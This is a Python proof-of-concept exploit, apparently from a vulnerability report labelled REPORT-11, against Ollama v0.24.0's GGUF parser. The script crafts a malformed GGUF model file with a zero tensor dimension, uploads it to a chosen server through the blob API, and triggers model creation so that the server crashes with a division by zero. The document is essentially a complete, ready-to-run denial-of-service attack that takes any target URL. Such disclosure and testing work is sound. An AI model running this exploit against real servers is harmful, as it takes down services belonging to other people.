#!/usr/bin/env python3
"""
PoC: GGUF Parser Division by Zero DoS (REPORT-11)
Target: Ollama v0.24.0 (llama.cpp ec98e2002)
Vulnerability: gguf.cpp:550 — INT64_MAX / ne[1] when ne[1] = 0
Impact: Server crash via SIGFPE (integer division by zero)

Usage: python3 poc_gguf_divzero.py http://target:11434
"""
import hashlib, io, struct, sys, json, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:11434"
MODEL = "test-divzero"


def craft_divzero_gguf():
    """Craft GGUF where ne[1] = 0 triggers division by zero at gguf.cpp:550"""
    buf = bytearray()
    buf += b'GGUF'                                  # magic
    buf += struct.pack('<I', 3)                      # version 3
    buf += struct.pack('<Q', 1)                      # n_tensors = 1
    buf += struct.pack('<Q', 1)                      # n_kv = 1

    # KV: general.alignment = 32 (required for offset calculation)
    key = b'general.alignment'
    buf += struct.pack('<Q', len(key)) + key
    buf += struct.pack('<I', 4)                      # GGUF_TYPE_INT32
    buf += struct.pack('<i', 32)

    # Tensor: ne = (4, 0, 1, 1), type = F32, offset = 0
    # ne[1] = 0 causes INT64_MAX / 0 = SIGFPE at gguf.cpp:550
    name = b'test.divzero'
    buf += struct.pack('<Q', len(name)) + name
    buf += struct.pack('<I', 2)                      # dims = 2
    buf += struct.pack('<q', 4)                      # ne[0] = 4
    buf += struct.pack('<q', 0)                      # ne[1] = 0  ← TRIGGERS DIV BY ZERO
    buf += struct.pack('<I', 0)                      # type = F32
    buf += struct.pack('<Q', 0)                      # offset = 0

    # Pad to alignment
    while len(buf) % 32 != 0:
        buf += b'\x00'

    # Dummy tensor data (won't be reached — crash happens during parsing)
    buf += b'\x00' * 64

    return bytes(buf)


def upload_blob(data, target):
    sha = hashlib.sha256(data).hexdigest()
    url = f"{target}/api/blobs/sha256-{sha}"
    req = urllib.request.Request(url, data=data, method='PUT')
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        print(f"[+] blob uploaded: sha256-{sha}")
        return sha
    except urllib.error.HTTPError as e:
        print(f"[-] blob upload failed: {e.code} {e.reason}")
        return None


def trigger_create(model, files, target):
    url = f"{target}/api/create"
    body = json.dumps({"name": model, "files": files}).encode()
    req = urllib.request.Request(url, data=body,
                                  headers={"Content-Type": "application/json"})
    try:
        resp = urllib.request.urlopen(req, timeout=60)
        for line in resp:
            data = json.loads(line)
            status = data.get('status', '')
            print(f"  status: {status}")
            if data.get('error'):
                print(f"  error: {data['error']}")
    except urllib.error.URLError as e:
        print(f"[+] Server crashed as expected: {e}")
        return True
    return False


if __name__ == "__main__":
    gguf_data = craft_divzero_gguf()
    print(f"[*] GGUF built: {len(gguf_data)} bytes")
    print(f"[*] SHA256: {hashlib.sha256(gguf_data).hexdigest()}")
    print(f"[*] Target: {TARGET}")
    print()

    sha = upload_blob(gguf_data, TARGET)
    if sha:
        files = {"model.gguf": f"sha256-{sha}"}
        print(f"[*] Triggering create...")
        crashed = trigger_create(MODEL, files, TARGET)
        if crashed:
            print(f"[+] PoC SUCCESSFUL — server crashed via division by zero")
        else:
            print(f"[-] Server did not crash — may be patched")
